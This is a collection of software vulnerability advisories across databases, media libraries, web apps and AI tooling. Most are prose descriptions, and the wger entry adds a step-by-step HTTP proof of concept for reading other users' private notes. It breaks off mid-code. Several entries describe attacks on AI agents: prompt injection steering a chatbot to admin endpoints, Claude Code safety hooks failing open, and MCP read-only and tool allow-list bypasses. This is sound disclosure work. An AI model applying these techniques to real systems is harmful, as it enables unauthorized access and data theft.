Zoho Corporation ManageEngine DDI Central version below 6201 is vulnerable to SQL injection in HA replication username handling leading to command execution as the PostgreSQL service account.

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: InnoDB).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.12, 9.7.0-9.7.3, 26.7.0-26.7.1; MySQL Cluster: 8.0.0-8.0.49, 8.4.0-8.4.12, 9.7.0-9.7.3 and  26.7.0-26.7.1. Difficult to exploit vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 4.4 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H).

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: InnoDB).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.12, 9.7.0-9.7.3, 26.7.0-26.7.1; MySQL Cluster: 8.0.0-8.0.49, 8.4.0-8.4.12, 9.7.0-9.7.3 and  26.7.0-26.7.1. Difficult to exploit vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 4.4 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H).

The Datadog Agent collects events and metrics from hosts and sends them to Datadog. Prior to datadog-apm-inject 0.66.0, the Datadog Single Step Instrumentation injector stores helper tooling in a predictable host directory. On Linux or Kubernetes systems with SSI enabled and at least one Java service instrumented through SSI, a local unprivileged attacker with shell access to the same host can influence that tooling and execute code with the privileges of the instrumented Java service. Services that use dd-java-agent without SSI and non-Java language runtimes are not affected. This issue is fixed in datadog-apm-inject 0.66.0.

FFmpeg before 9.1 contains a heap buffer overflow vulnerability in modplug_read_header() in libavformat/libmodplug.c that allocates the buffer using max_size instead of sz. When max_size is set to 0, attackers can supply crafted module files that avio_read() copies into a zero-sized buffer, causing memory corruption, crashes, or possible code execution.

FFmpeg before 9.1 contains an out-of-bounds write vulnerability in ogg_buffer_data() in libavformat/oggenc.c because ogg_buffer_page() leaves a full page current after failed allocation. When page allocation fails, a memset with length (size_t)-1 or an overflowing memcpy writes past the segment table, causing heap memory corruption and crashes when writing Ogg output.

FFmpeg before 9.1 contains a double free vulnerability in the fill_marker() function of libavformat/imf_cpl.c that frees a Marker label without clearing the pointer when default scope allocation fails. Attackers can supply a crafted Composition Playlist with a Marker Label lacking a scope attribute, triggering a second free in imf_marker_free() under memory pressure and causing memory corruption or a crash.

FFmpeg 7.0 before 8.1.3 and 9.x before 9.0.2 contains a heap out-of-bounds write vulnerability in vk_av1_decode_slice() in libavcodec/vulkan_av1.c because the tile-count limit is checked only on entry. Attackers can supply a crafted AV1 stream with more than 256 tiles decoded via the Vulkan hardware accelerator to overflow tile_sizes and corrupt heap memory.

FFmpeg 7.1 through 9.0.2 contains an integer overflow in ff_vk_decode_add_slice() in libavcodec/vulkan_decode.c that miscalculates the Vulkan hwaccel bitstream buffer size. Attackers can supply a crafted stream with over 2 GiB of slice data per frame, causing memcpy() to write past a smaller pooled host-mapped buffer.

FFmpeg 9.0 through 9.0.2 contains an integer overflow vulnerability in libavcodec/ffv1enc_vulkan.c that undersizes the float remap GPU buffer for large frames. Attackers can supply large GBRPF32 or GBRAPF32 images or videos that, when transcoded to FFV1 with the Vulkan encoder, trigger out-of-bounds GPU memory writes causing crashes or memory corruption.

items.title: LangGraph: Unencoded identifiers in LangGraph SDK v3 streaming can redirect authenticated GET requests
items.description: LangGraph Python SDK is used to connect to running LangGraph API servers, manage assistants, threads and stream runs from Python applications. From langgraph-sdk 0.4.0 until 0.4.6, and from langgraph 1.2.3 until 1.2.14 when RemoteGraph v3 streaming uses an affected langgraph-sdk version, the synchronous and asynchronous v3 stream get_tree and _fetch_state helpers interpolate caller-controlled assistant_id and thread_id values into authenticated GET request paths without using _quote_path_param. Relative path segments can therefore be normalized into another readable path on the configured server while retaining authentication headers. This issue is fixed in langgraph-sdk 0.4.6 and langgraph 1.2.14.

GnuTLS v3.8.13 does not reject a critical keyUsage extension when it cannot be processed, such as when extnValue is an ASN.1 NULL (05 00) instead of a BIT STRING. NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

Misinterpretation of SQL statement text in the database layer of Progressive Robot hMailServer 6.0.0-B1 through 6.3.7 allows a remote unauthenticated attacker to have a failed database write reported to the server as successful. The layer answers a failed statement as a success when it finds the marker [IGNORE-ERRORS], which is meant only for the server's own schema statements (its upgrade scripts and the database log's tables), and statements carry values from outside - an envelope address, the user name of a failed logon, a message's headers - in their text on MySQL/MariaDB and PostgreSQL, and in the batches of the database log on every engine. Up to 6.2.18 the marker was honoured anywhere in a statement, a value included, on MySQL/MariaDB and PostgreSQL. From 6.2.19 it was honoured only inside a comment, but the layer read a backslash inside a string literal as an escape, which SQL Server, SQL Server Compact and PostgreSQL with standard_conforming_strings on (its default) do not, so that on those engines a value holding a backslash could make the layer take part of the statement's literals for statement text and find the marker there: on PostgreSQL from 6.3.3 for every statement carrying an outside value that holds a backslash, with no setting changed for a message delivered into a local mailbox (through an internationalised (SMTPUTF8) envelope sender) and for the IP range an auto-ban writes (named after the user name of the failed logon), and on SQL Server and SQL Server Compact for the database log, when the server logs to the database (logging is off, and the log device is files, by default). A statement run outside a transaction that then failed - a constraint, a deadlock, a lock or statement timeout, a full disk, and up to 6.2.18 a lost connection - was answered as a success, and its caller went on as if the row had been written: a message delivered into a local mailbox could be counted as delivered with no row to show it and no failure notice to its sender, and a message accepted with 250 could be left with no queue row and never delivered (up to 6.2.18, and on PostgreSQL from 6.3.3 when every recipient's address carries the marker too, which needs an address that takes any local part); an auto-ban whose IP range was not written could be logged and counted as applied, with no error reported, while the address stayed unbanned; and message metadata (written only when message indexing is on), entries of the database log and rows of features an administrator turns on could be lost without an error. On MySQL/MariaDB up to 6.2.18 the caller was handed whatever identifier the client library still held for the connection - 0, or that of an insert its last successful statement made, in whatever table - under which a queued message's recipients were then written, so that another message still in the queue could be delivered to them as well. This flaw gives a value no way to change what a statement does, and no privilege is gained.

items.title: pmo-platform: Security Hooks Fail Open Because Runtime PATH Excludes Documented jq Install Paths
items.description: pmo-platform is a modular PMO and release-management platform for Claude Code. Prior to 3.69.1, core/hooks/block-credential-reads.sh, core/hooks/block-egress.sh, core/hooks/block-fs-boundary.sh, and core/hooks/block-mcp-writes.sh pin PATH to /usr/bin:/bin, hard-code jq as /usr/bin/jq, and return success when jq is unavailable there. On systems where jq exists only in a Homebrew path, including affected pre-Sequoia or Homebrew-only macOS installations, the hooks can skip credential-read, network-egress, filesystem-boundary, and MCP-write controls. Native deny rules independently protect some credential paths but do not backstop the egress or MCP controls. An attacker who can influence a prompt, repository, or evaluation flow can use the skipped checks to expose secrets or perform unauthorized tool actions. This issue is fixed in version 3.69.1.

vLLM from 0.28.0 before 0.30.0 contains a reachable assertion vulnerability in GPUModelRunner._init_xdrope_positions that allows remote attackers to crash the engine by submitting embeddings-only requests. Attackers can send a /v1/completions request containing only prompt_embeds to XD-RoPE models with --enable-prompt-embeds, terminating the EngineCore and API server for all clients.

An out-of-bounds read in the TDS RPC procedure-name parser in the Babelfish for PostgreSQL extension versions 1.0-1.5, 2.1-2.15, 3.1-3.12, 4.0-4.8, 5.1-5.4 and in Amazon Aurora PostgreSQL with Babelfish might allow remote authenticated users to read adjacent process memory or cause a denial of service via a malformed TDS RPC request to the TDS port (default 1433).



To remediate this issue, we recommend users upgrade to Babelfish for PostgreSQL extension versions 4.10, 5.6, 6.1 or later. As a workaround, restrict network access to the TDS port (default 1433). Customers using Amazon Aurora PostgreSQL with Babelfish should upgrade their cluster to Aurora PostgreSQL 13.9.16 (1.5.5), 13.23.3 (1.17.2), 14.6.16 (2.3.5), 14.17.8 (2.12.4), 14.18.6 (2.13.3), 14.19.5 (2.14.2), 14.20.5 (2.15.2), 14.22.3 (2.16.1), 14.23.1 (2.17.0), 15.10.8 (3.8.4), 15.12.8 (3.9.4), 15.13.6 (3.10.3), 15.14.5 (3.11.2), 15.15.5 (3.12.2), 15.17.3 (3.13.1), 15.18.1 (3.14.0), 16.8.8 (4.5.5), 16.9.6 (4.6.3), 16.10.5 (4.7.2), 16.11.5 (4.8.2), 16.13.3 (4.9.1), 16.14.1 (4.10.0), 17.4.8 (5.1.4), 17.5.6 (5.2.3), 17.6.5 (5.3.2), 17.7.5 (5.4.2), 17.9.3 (5.5.1), 17.10.1 (5.6.0), 18.3.4 (6.0.2), 18.4.1 (6.1.0) or later, and apply any pending maintenance to ensure they are on the latest patch.

HumHub Community Edition 1.19.0 contains a stored cross-site scripting vulnerability in the friendship confirmation dialog. An authenticated low-privileged member can save HTML in their first and last name. When another authenticated user clicks Friends for that profile, HumHub places the decoded display name into a modal through jQuery html(), causing attacker-controlled markup to execute in the victim's HumHub origin.

WebVirtCloud through commit bb920b0 contains a missing authorization vulnerability that allows low-privileged authenticated users to reach MigrateViewSet and CreateInstanceViewSet because no permission_classes are declared, so Django REST Framework defaults to AllowAny. Attackers can send requests to /api/v1/migrate/ or the compute instance create endpoint to migrate or undefine other users' virtual machines and create volumes and domains on any compute host.

Dify before 1.15.0 contains a server-side request forgery vulnerability that allows any authenticated console user to bypass SSRF protections and issue arbitrary HTTP requests to internal services and cloud metadata endpoints due to the Squid proxy configuration only defining source ACLs without destination deny rules and the make_request() helper performing no independent destination IP validation. Attackers can use endpoints such as GET /console/api/remote-files/<url>, POST /console/api/remote-files/upload, the HTTP Request workflow node, website crawl, or document import from URL to reach internal components like the sandbox, internal APIs, and PostgreSQL, and on AWS deployments read IAM credentials from the instance metadata service, with the HTTP Request node further enabling POST, PUT, and DELETE writes to internal services relying on network isolation for authorization.

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: Server: Replication).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.13, 9.7.0-9.7.4, 26.10; MySQL Cluster: 8.0.0-8.0.50, 8.4.0-8.4.13, 9.7.0-9.7.4 and  26.10. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in takeover of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 7.2 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H).

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: Server: Optimizer).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.13, 9.7.0-9.7.4, 26.10; MySQL Cluster: 8.0.0-8.0.50, 8.4.0-8.4.13, 9.7.0-9.7.4 and  26.10. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in takeover of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 7.2 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H).

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: Server: Logging).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.13, 9.7.0-9.7.4, 26.10; MySQL Cluster: 8.0.0-8.0.50, 8.4.0-8.4.13, 9.7.0-9.7.4 and  26.10. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in takeover of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 7.2 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H).

DBHub before 1.7.0 contains a read-only mode bypass vulnerability that allows MCP clients restricted to readonly execute_sql to run write and DDL statements via backslash-escaped quotes. Attackers can hide stacked statements that clear transaction_read_only or COMMIT inside strings misparsed by scanSingleQuotedString, letting them modify or drop MySQL, MariaDB, or PostgreSQL data.

Untrusted search path in PostgreSQL vacuumdb allows a database owner to execute arbitrary SQL as the database user running vacuumdb, via shadowing operators used in the --missing-stats-only catalog query.  The pg_upgrade documentation recommends an affected vacuumdb invocation.  Within major version 18, minor versions before PostgreSQL 18.7 are affected.  Versions before PostgreSQL 18 are unaffected.

PostgreSQL Anonymizer's range-based dummy functions dont constraint the range size. This vulnerability can be exploited to exhaust the memory of a backend and OOM-kill it (when ovecommit is on), which results in a cluster-wide crash recovery. The problem is resolved in PostgreSQL Anonymizer 3.3.0 and later versions.

PostgreSQL Anonymizer's `anon.image_blur()` function doesn't check the declared dimension of the provided image, allowing an attacker to provide a small image with enormous declared dimensions. This vulnerability can be exploited to exhaust the memory of a backend and OOM-kill it (when ovecommit is on), which results in a cluster-wide crash recovery. The problem is resolved in PostgreSQL Anonymizer 3.3.0 and later versions.

AVideo is a video-sharing Platform. Prior to 8.1.0, `view/queue.php` uses `pathinfo` on the caller-controlled `fileURI` and stores its filename through `setTitle` in `encoder_queue.title` without neutralization. `fileURI` is not in the `objects/security.php` filter lists, and the `Login::canUpload()` capability needed to submit a queue entry can be self-granted using an attacker-controlled login site without legitimate encoder credentials. `view/index.php` loads `queue.json` from `view/queue.json.php` into the `#grid` jQuery Bootgrid table; its title formatter concatenates `row.title` into raw cell HTML. An attacker can therefore store an HTML title whose event handler runs in a privileged viewer's browser. `Encoder::getAll` limits nonadministrators to their own streamer's rows, so the victim must be an administrator who sees all rows or an operator on the attacker's streamer. A second `.html()` sink in the progress panel uses the same title but additionally depends on a helper script loaded from the streamer; the Bootgrid sink is reachable from encoder code alone. The script can read session-visible data and rendered streamer credentials, act with the viewer's privileges, and execute again for each qualifying viewer until the row is removed. This issue is fixed in version 8.1.0.

items.title: Kubeflow Pipelines: RBAC bypass on shared pipelines allows any authenticated user to delete or modify global pipelines
items.description:
## Summary

In multi-user mode, the Kubeflow Pipelines API server skipped authorization checks for shared/global pipelines with an empty namespace. This exception applied to write and delete operations as well as reads, allowing an authenticated user to modify or delete shared pipelines without the required Kubernetes RBAC permissions.

## Impact

Unauthorized modification compromises the integrity of shared pipeline definitions and versions. Unauthorized deletion can make shared pipelines unavailable.

Execution of a modified pipeline can cause attacker-controlled workload behavior, but this is a conditional downstream consequence requiring the modified pipeline to be executed. Modification alone does not demonstrate immediate worker code execution.

Reading shared pipelines is intentionally permitted and remains permitted after the fix. Consequently, access to shared pipeline configuration does not establish an additional confidentiality impact from this write-authorization defect. The confidentiality metric is None; the integrity and availability metrics reflect unauthorized modification and deletion of shared pipelines.

The affected authorization boundary is shared pipelines in multi-user deployments. Single-user deployments intentionally bypass these multi-user authorization checks.

## Patches

Fixed by [kubeflow/pipelines#13288](https://github.com/kubeflow/pipelines/pull/13288), with the fix included in 2.16.1.

Read-only operations on shared pipelines remain allowed. For write and delete operations, the API server checks Kubernetes RBAC permissions against the KFP system namespace, because shared pipelines have no namespace of their own.

## Scope of this fix

The 2.16.1 fix addresses the shared-pipeline authorization paths described above. It does not fix every shared-pipeline write path: the separate shared-pipeline upload authorization defect is tracked in [GHSA-rjr3-43j3-4q8g / CVE-2026-77596](https://github.com/kubeflow/pipelines/security/advisories/GHSA-rjr3-43j3-4q8g). Consult that advisory for its affected versions and remediation; 2.16.1 must not be interpreted as fixing that separate upload defect.

## Workarounds

Until upgrading, restrict access to the Pipelines API to trusted users through deployment-level access controls. Namespace RBAC alone does not correct the affected shared-pipeline authorization path.

items.title: Action Pack: Possible restoration of destroyed sessions in Action Dispatch CacheStore
items.description: Action Pack is a framework for handling and responding to web requests. Prior to 8.1.4.1 and 8.0.5.2, ActionDispatch::Session::CacheStore writes a session back to the cache at the end of each request that loaded it, without checking that the session's cache entry still exists. When a concurrent request destroys the session, through reset_session on logout or by deleting its cache entry on the server, a request that loaded the session earlier and finishes later restores it under its original session ID. Logout and server-side revocation could therefore fail to end a session, and an attacker who holds a stolen session cookie could keep that session valid across the victim's logout. Applications that use config.session_store :cache_store are affected, with any cache backend. ActionDispatch::Session::CookieStore is not affected, nor is ActionDispatch::Session::MemCacheStore with Dalli 4.0.0 or later, whose session store does not write back a session that was deleted. This issue is fixed in versions 8.1.4.1 and 8.0.5.2.

Kubeshark is an eBPF-powered network observability tool for Kubernetes. From 53.1.0 until 53.4.0, the start_kubeshark MCP tool in cmd/mcpRunner.go uses callStartKubeshark to append caller-controlled pod_regex as a bare positional argument to kubeshark tap without a -- end-of-options separator, allowing a value beginning with --set to be parsed as a Helm value override. An attacker who influences tool arguments against kubeshark mcp --allow-destructive can redirect the privileged worker, Hub, and front images through tap.docker.registry and tap.docker.tag to an attacker-controlled registry. Because the deployed worker DaemonSet runs privileged with host networking and host filesystem access, a malicious image can obtain node and cluster-admin access when the host already has permission to deploy it. This issue is fixed in version 53.4.0.

OpsTree BuildPiper before 2.7.0 contains an authorization bypass vulnerability that allows authenticated users to create environments on unassigned Kubernetes clusters by tampering with cluster_id and namespaces values. Attackers can modify requests to POST /api/v1/project/{project_id}/env/ to target another project's cluster, then trigger builds and deployments into it, bypassing project isolation.

ImageMagick before 7.1.2-35 and 6.9.13-60 contains an infinite loop vulnerability in the SVG decoder because QueueAuthenticPixelCacheNexus in MagickCore/cache.c fails to validate requested region width and height. Attackers can supply a crafted SVG image that repeatedly requests a non-advancing pixel region, consuming CPU and hanging the decoding worker.

Keep 0.34.10 through 0.55.0 contains a blind SQL injection vulnerability in its CEL-to-SQL converter, which inserts bracket-indexed JSON keys from CEL filters unescaped into JSON path expressions for SQLite, PostgreSQL, and MySQL. Authenticated users with read:alert permission can submit crafted CEL expressions to /alerts/query or the cel parameter of /incidents, using result counts as a boolean oracle to extract other tenants' alerts and password hashes.

phpMyFAQ from 4.2.0-alpha before 4.2.0-RC.2 contains an authorization bypass vulnerability in the multisite Redis configuration store that is not tenant-scoped. As a result, tenant administrators can read and overwrite the master instance's effective configuration. Attackers can save configuration through /admin/api/configuration, optionally resetting storage.redisPrefix, to redirect master SMTP, set a known API token, or alter authentication settings.

items.title: containerd image-triggered daemon crash via malformed digest in subject-annotated descriptor
items.description:
### Impact

A bug in containerd's image manifest processing causes an unrecovered panic when a child descriptor contains the `io.containerd.manifest.subject` annotation and a malformed digest. Pulling or importing such an image through the transfer service (including default CRI `PullImage` requests) crashes the containerd daemon. In Kubernetes environments, `kubelet` retries failed image pulls with backoff, allowing a pod referencing an untrusted image to repeatedly crash containerd and disrupt container operations on the worker node.

### Patches

This bug has been fixed in containerd 2.4.2, 2.3.7, and 2.2.10. Users should update to these versions to resolve the issue.

### Workarounds

Restrict pod image references to trusted registries (for example, using a Kubernetes `ValidatingAdmissionPolicy` or admission webhook) and only pull or import images from trusted sources.

### Credits

The containerd project would like to thank @melihgurlek, LEI WANG (@ssst0n3) and Haoyuan Zhang (@zj1ng7), and OpenSec Intelligence who independently discovered and responsibly disclosed this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)
* Email us at [security@containerd.io](mailto:security@containerd.io)

To report a security issue in containerd:
* [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new)
* Email us at [security@containerd.io](mailto:security@containerd.io)

Heym before 0.0.148 passes Playwright navigate-step URLs to page.goto() without validating the scheme and runs step-based scripts inside the backend container. A signed-in user who can run workflows can navigate to file:// URLs and use getText to read known-path files such as the Kubernetes ServiceAccount token or Docker secrets.

FlowIntel contains multiple security flaws in its note variable resolution, chatbot API tooling, and AI report generation.

- Note variable references (e.g. cross-case or cross-task lookups) were resolved using the viewing user's privileges rather than the destination case's audience. An authenticated user with access to a shared or imported note could embed references to private cases, causing sensitive case data to be pulled into AI report requests, exports, and MISP sends without the referenced case's audience having granted read access.

- The chatbot API tool permitted the language model to invoke any FlowIntel API endpoint, including administrative routes and state-changing GET operations, without an allow-list or path validation. An attacker who can influence the model's instructions (e.g. via untrusted case content) could induce data modification or access restricted endpoints.

- AI report generation passed the Ollama bearer token and full case content as command-line arguments to a child process, exposing them in the system process table to any local user.

Affected versions: FlowIntel prior to 4.1.0.

MISP contains a Server-Side Request Forgery (SSRF) vulnerability in its feed and sync HTTP request handling. When the application uses libcurl as the HTTP transport, the CURLOPT_FOLLOWLOCATION option was enabled by default, causing the library to automatically follow HTTP redirects without the application's own per-hop validation logic being invoked.

- Feed requests: MISP implements its own redirect validation for feed sources, but libcurl was following redirects before that validation could execute, allowing a malicious or compromised feed source to redirect the request to arbitrary internal URLs.
- Sync requests: Sync peers are server-configured, and the application does not perform per-hop redirect validation for sync traffic. libcurl's automatic redirect following allowed a malicious sync peer to redirect the request to internal network resources.

An attacker who is a configured sync peer, controls a feed source URL, or can influence DNS resolution for a configured endpoint can exploit this to cause the MISP server to issue requests to arbitrary internal services, potentially reading sensitive data or interacting with internal APIs that are not otherwise exposed.

Affected: MISP versions prior to 2.5.52.

AutoGPT is a workflow automation platform for creating, deploying, and managing continuous artificial intelligence agents. In versions 0.7.1 through 0.8.4, chat and prompt text passed to the Claude Code CLI is pre-processed before reaching the model, bypassing AutoPilot's tool allow-list and PreToolUse hooks. In both AutoPilot's Claude Agent SDK path and the graph orchestrator block's extended_thinking SDK mode, messages starting with / execute CLI commands or bundled skills, while @<path> mentions read files or list directories on the host and attach the results to the model request. Signed-in users, members of linked chat channels, graph authors, or indirect tool output carried into turn history can make the CLI read files accessible to the copilot executor process, whose contents reach the model provider and can be repeated in replies, and run commands that compact or clear the session, switch the model, or modify the CLI's settings.json file. This issue is fixed in version 0.9.0.

WatchAlert 2.0.0 through 3.9.20 contains an insecure direct object reference vulnerability in the /api/w8t/datasource/dataSourceGet endpoint that lets authenticated users read other tenants' datasources because lookups omit tenant_id filtering. Tenant members with datasource view permission can request another tenant's datasource ID to obtain basic auth passwords, AWS and Alibaba Cloud keys, and Kubernetes kubeconfigs.
IBM CockroachDB PostgreSQL for IBM VPC 26.2.0 through 26.2.3, 25.4.0 through 25.4.12, and 25.2.0 through 25.2.20 is vulnerable to privilege escalation via user-defined function.

A flaw in Node.js Permission Model filesystem enforcement can grant access to paths that do not match a wildcard `--allow-fs-read` or `--allow-fs-write` rule.

When the requested path is shorter than the prefix of a wildcard grant, the radix tree lookup stops comparing early and treats the path as a match. For example, `--allow-fs-read=/etc/passwd.*` also allows reading `/etc/passwd`. This requires the wildcard grant to sit directly under the root of the permission tree, for example when it is the only grant for that scope. This is a different root cause from CVE-2026-58043.

This vulnerability affects Node.js **26.x**.

Authorization Bypass Through User-Controlled Key (CWE-639) in the cart and wishlist repositories of MarcosCamara01 Ecommerce Template allows any authenticated user to delete and modify the cart and wishlist rows of any other user, because cartRepository.delete(), cartRepository.updateQuantityInternal() and wishlistRepository.delete() in src/lib/db/drizzle/repositories/ match rows by primary key alone, with no predicate on the owning user, and the per user authorization for those three operations rests on PostgreSQL row level security. The migrations run ALTER TABLE ... ENABLE ROW LEVEL SECURITY and create policies comparing app.current_user_id() with user_id, but never ALTER TABLE ... FORCE ROW LEVEL SECURITY, and PostgreSQL does not apply policies to the role that owns a table. The template uses one DATABASE_URL both to run the migrations, which create the tables, and for the application at runtime, so the application connects as the owner of the tables and the policies do not apply to it. cart_items.id and wishlist.id are sequential bigserial values, so the identifiers of rows belonging to other users can be enumerated, and the update path returns the modified row, which carries the identifier of the user it belongs to. This results in the destruction and modification of cart and wishlist contents belonging to other accounts of the installation.

items.title: wger: cross-tenant admin notes/contracts leak via gym=None bypass (5 views)
items.description:
### Summary

Five gym management views in wger apply a flawed gym-scope guard (`gym_a != gym_b`) that silently passes when both operands are `None`. A trainer with `gym.gym_trainer` and `gym.add_adminusernote` permissions and no gym assignment (`gym=None`) can read private admin notes, uploaded documents, gym contracts, user configuration, and user permission data for **any other unaffiliated user** on the instance. The subsequent querysets filter only on the attacker-supplied `member_id` with no secondary gym-scoped validation, so all records are disclosed.

### Details

**Files**: `wger/gym/views/user.py`, `wger/gym/views/admin_notes.py`, `wger/gym/views/document.py`, `wger/gym/views/contract.py`, `wger/gym/views/user_config.py`

The same flawed comparison pattern appears across at least five views:

```python
# VULNERABLE - applied in admin_notes_list, documents_list, contracts_list,
#              user_config, and gym_permissions_user_edit
if request.user.userprofile.gym != user.userprofile.gym:
    return HttpResponseForbidden()

# After the guard (admin notes example):
notes = AdminUserNote.objects.filter(member=member)  # only filtered by member_id
```

When both `request.user.userprofile.gym` and `user.userprofile.gym` are `None`, Python evaluates `None != None` as `False`, and `HttpResponseForbidden` is never reached. The subsequent queryset applies only the attacker-supplied `member` (user ID) as a filter — there is no secondary check tying the queryset to the requesting trainer's gym. All private admin notes, documents, and contracts for the target user are returned in the response body.

**Affected endpoints**:
- `GET /en/gym/notes/list/user/<member_pk>` -> admin notes list view
- `GET /en/gym/documents/list/user/<member_pk>` -> documents list view
- `GET /en/gym/contract/list/<member_pk>` -> contracts list view
- `GET /en/gym/user/<member_pk>/config` -> user config view
- `GET /en/gym/user/<member_pk>/permissions` -> permission edit view

**Suggested patch**:

```diff
--- a/wger/gym/views/user.py
+++ b/wger/gym/views/user.py
-    if request.user.userprofile.gym != user.userprofile.gym:
-        return HttpResponseForbidden()
+    trainer_gym_id = request.user.userprofile.gym_id
+    member_gym_id  = user.userprofile.gym_id
+
+    if trainer_gym_id is None or trainer_gym_id != member_gym_id:
+        return HttpResponseForbidden()

# Also tighten the queryset with a gym-scoped secondary filter:
-    notes = AdminUserNote.objects.filter(member=member)
+    notes = AdminUserNote.objects.filter(
+        member=member,
+        member__userprofile__gym_id=request.user.userprofile.gym_id,
+    )
```

Extract a shared helper `assert_same_gym(trainer, member)` and call it consistently from all five affected views to eliminate future drift.

### PoC

Tested on `wger/server:latest` Docker image. Test users: `trainer1` (`gym.gym_trainer` + `gym.add_adminusernote` permissions, `userprofile.gym=None`) and `alice` (regular user, `userprofile.gym=None`, has a private admin note pre-seeded).

**Step 1** - Authenticate as trainer with required perms and gym=None:

```
POST /en/user/login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=trainer1&password=[REDACTED]&csrfmiddlewaretoken=[REDACTED]

-> 302 Found; Set-Cookie: sessionid=[trainer1_session]
```

**Step 2** - Read victim's private admin notes:

```
GET /en/gym/notes/list/user/2 HTTP/1.1
Host: target
Cookie: sessionid=[trainer1_session]

-> 200 OK
body contains all private admin notes for user 2:
  "PRIVATE_NOTE_ABOUT_ALICE_SALARY_50K"
  "PHASE4_SECRET_SALARY_100K"
```

**Step 3** - Read victim's documents and contracts (same pattern):

```
GET /en/gym/documents/list/user/2
GET /en/gym/contract/list/2

-> 200 OK for each; all records disclosed
```

**Step 4** (optional) - Mass enumeration across all gym=None users:

```
Iterate user PKs 1..N:
GET /en/gym/notes/list/user/{uid}
-> 200 = gym=None victim (notes leaked)
-> 403 = gym-assigned user (check works correctly when gym values differ)
```

**RBAC Disproof Protocol**:
- Scenario A (admin, gym=1 -> member gym=1) -> HTTP 200 (expected - same-gym read is a documented feature)
- Scenario B (trainer1, gym=None -> alice gym=None) -> **HTTP 200 with PII in body** (expected HTTP 403)
- Scenario C (admin, gym=1 -> alice gym=None) -> HTTP 403 (expected - guard works when gyms differ; confirms bypass is `None`-specific)

Reproducibility: 2/2 runs after clean-baseline database reset.

### Impact

An authenticated trainer with `gym.gym_trainer` + `gym.add_adminusernote` permissions and `userprofile.gym=None` can:

1. Enumerate and read all private admin notes for every other `gym=None` user (notes may contain salary data, medical notes, disciplinary records).
2. Download all uploaded documents attached to those users (contracts, ID scans, medical forms).
3. Read all gym contracts (financial terms, subscription details).
4. Read user configuration details.
5. Via the permissions endpoint, potentially **modify victim permissions** (creates a privilege escalation path - not fully explored in this submission but the endpoint is reachable).

**Affected deployments**: every wger instance where `gym.gym_trainer` + `gym.add_adminusernote` are delegated to non-admin users AND any other users exist with `gym=None`. The `gym=None` state is the **default for newly registered users** before manual gym assignment, so every public-registration wger instance is affected.

**Severity**: High (CVSS 7.1). Network-reachable, low complexity, requires only low privilege (delegated trainer), scope unchanged (same wger authority), high confidentiality loss across all unaffiliated accounts, low integrity impact (permission-edit view reachable).

This is structurally the same bug class as the sibling findings affecting `trainer_login` and `reset_user_password` (submitted separately). The root cause - Django ORM object-`!=` returning `False` when both sides are `None` - warrants a shared `same_gym()` helper applied across all five views.

items.title: wger: Trainer Privilege Escalation - Improper Privilege Management
items.description:
### Summary

A user with only the `gym_trainer` permission can deactivate any account in the same gym, including `gym_manager` and `general_gym_manager` accounts. The `UserDeactivateView` grants access to anyone holding **any one** of `gym.manage_gym`, `gym.manage_gyms`, or `gym.gym_trainer` (OR logic via `WgerMultiplePermissionRequiredMixin`), and performs no privilege-hierarchy check to prevent a lower-privileged role from disabling a higher-privileged one.

### Details

`UserDeactivateView` (file: `wger/core/views/user.py`, line 378) is configured with:

```python
permission_required = ('gym.manage_gym', 'gym.manage_gyms', 'gym.gym_trainer')
```

`WgerMultiplePermissionRequiredMixin` (file: `wger/utils/generic_views.py`, line 48) treats this tuple as an OR check -- any single permission is sufficient:

```python
class WgerMultiplePermissionRequiredMixin(PermissionRequiredMixin):
    def has_permission(self):
        for permission in self.get_permission_required():
            if self.request.user.has_perm(permission):
                return True      # <-- ANY one permission is enough
        return False
```

The `dispatch()` method only verifies same-gym membership:

```python
def dispatch(self, request, *args, **kwargs):
